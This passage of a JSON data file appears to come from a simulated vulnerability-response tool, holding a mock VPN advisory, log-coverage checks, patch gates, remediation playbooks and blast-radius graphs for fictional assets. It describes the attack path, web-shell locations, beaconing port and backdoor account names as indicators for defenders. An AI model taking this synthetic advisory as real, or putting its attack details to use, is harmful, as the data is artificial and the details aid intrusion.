          "compromised": true
        },
        {
          "id": "meridian-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": true
        },
        {
          "id": "meridian-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "meridian-api-server-01",
          "target": "meridian-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "high"
        },
        {
          "source": "meridian-api-server-01",
          "target": "meridian-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "high"
        },
        {
          "source": "meridian-cred-vault",
          "target": "meridian-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "high"
        },
        {
          "source": "meridian-jump-host-01",
          "target": "meridian-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "meridian-dc-ad-01",
          "target": "meridian-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 88,
      "summary": "CRITICAL BLAST RADIUS ALERT: Host meridian-api-server-01 possesses active Kerberos tickets and SSH keys capable of pivoting directly to Domain Controller (meridian-dc-ad-01) and Primary Database. Immediate VLAN isolation prevents tier-0 domain compromise."
    }
  },
  "ASSET-MERIDIAN-016": {
    "asset": {
      "id": "ASSET-MERIDIAN-016",
      "host_name": "meridian-unkn-asset-02",
      "tenant_id": "meridian-finance",
      "owner": "admin@meridianfinance.in",
      "product": "EdgeGate VPN",
      "version": "Unknown",
      "internet_facing": false,
      "criticality": "medium",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.88",
      "exposure_tier": "high",
      "status": "needs_inventory",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-MERIDIAN-016",
      "overall_coverage": 0.969,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 42,
          "coverage_ratio": 0.933,
          "gaps": [
            "Missing 3 days of historical telemetry (42/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": true,
      "blind_spots": [
        "AUTH: Only 43 of 45 days available",
        "NETWORK: Only 43 of 45 days available",
        "FILE: Only 42 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-MERIDIAN-016",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 96% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-meridian-unkn-asset-02"
          ]
        }
      ],
      "coverage_score": 0.969,
      "coverage_report": {
        "asset_id": "ASSET-MERIDIAN-016",
        "overall_coverage": 0.969,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 42,
            "coverage_ratio": 0.933,
            "gaps": [
              "Missing 3 days of historical telemetry (42/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": true,
        "blind_spots": [
          "AUTH: Only 43 of 45 days available",
          "NETWORK: Only 43 of 45 days available",
          "FILE: Only 42 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.085138+00:00",
      "verdict_hash": "39c5c00802e7938a9c2b0dde86d3b6d3a3369fae54b8f7b8d3cba0b70bfa8512"
    },
    "gate": {
      "asset_id": "ASSET-MERIDIAN-016",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.085142+00:00"
    },
    "clock": {
      "asset_id": "ASSET-MERIDIAN-016",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113261+00:00",
      "deadline_time": "2026-10-19T17:48:03.113261+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-MERIDIAN-016-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-MERIDIAN-016",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate meridian-unkn-asset-02 (192.0.2.88) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-MERIDIAN-016",
      "root_node_id": "meridian-unkn-asset-02",
      "nodes": [
        {
          "id": "meridian-unkn-asset-02",
          "label": "meridian-unkn-asset-02 (Focal Gateway)",
          "type": "host",
          "criticality": "medium",
          "compromised": false
        },
        {
          "id": "meridian-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "meridian-unkn-asset-02",
          "target": "meridian-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "meridian-unkn-asset-02",
          "target": "meridian-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "meridian-cred-vault",
          "target": "meridian-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "meridian-jump-host-01",
          "target": "meridian-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "meridian-dc-ad-01",
          "target": "meridian-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-HARBOR-002": {
    "asset": {
      "id": "ASSET-HARBOR-002",
      "host_name": "harbor-vpn-gw-02",
      "tenant_id": "harbor-logistics",
      "owner": "admin@harborlogistics.in",
      "product": "EdgeGate VPN",
      "version": "9.2.1",
      "internet_facing": true,
      "criticality": "high",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.196",
      "exposure_tier": "high",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-HARBOR-002",
      "overall_coverage": 0.973,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 42,
          "coverage_ratio": 0.933,
          "gaps": [
            "Missing 3 days of historical telemetry (42/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [
        "ENDPOINT: Only 42 of 45 days available",
        "AUTH: Only 44 of 45 days available",
        "NETWORK: Only 43 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-HARBOR-002",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 97% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-harbor-vpn-gw-02"
          ]
        }
      ],
      "coverage_score": 0.973,
      "coverage_report": {
        "asset_id": "ASSET-HARBOR-002",
        "overall_coverage": 0.973,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 42,
            "coverage_ratio": 0.933,
            "gaps": [
              "Missing 3 days of historical telemetry (42/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [
          "ENDPOINT: Only 42 of 45 days available",
          "AUTH: Only 44 of 45 days available",
          "NETWORK: Only 43 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.089616+00:00",
      "verdict_hash": "23853a41f7b1e32bcbc2fbd51efb4ccf54487b102ed0a18a66155b94fbd4ae40"
    },
    "gate": {
      "asset_id": "ASSET-HARBOR-002",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.089620+00:00"
    },
    "clock": {
      "asset_id": "ASSET-HARBOR-002",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113282+00:00",
      "deadline_time": "2026-10-19T17:48:03.113282+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-HARBOR-002-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-HARBOR-002",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate harbor-vpn-gw-02 (192.0.2.196) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-HARBOR-002",
      "root_node_id": "harbor-vpn-gw-02",
      "nodes": [
        {
          "id": "harbor-vpn-gw-02",
          "label": "harbor-vpn-gw-02 (Focal Gateway)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "harbor-vpn-gw-02",
          "target": "harbor-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "harbor-vpn-gw-02",
          "target": "harbor-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "harbor-cred-vault",
          "target": "harbor-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "harbor-jump-host-01",
          "target": "harbor-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "harbor-dc-ad-01",
          "target": "harbor-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-HARBOR-005": {
    "asset": {
      "id": "ASSET-HARBOR-005",
      "host_name": "harbor-api-server-01",
      "tenant_id": "harbor-logistics",
      "owner": "admin@harborlogistics.in",
      "product": "EdgeGate VPN",
      "version": "9.0.2",
      "internet_facing": false,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.22",
      "exposure_tier": "high",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-HARBOR-005",
      "overall_coverage": 0.973,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 42,
          "coverage_ratio": 0.933,
          "gaps": [
            "Missing 3 days of historical telemetry (42/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
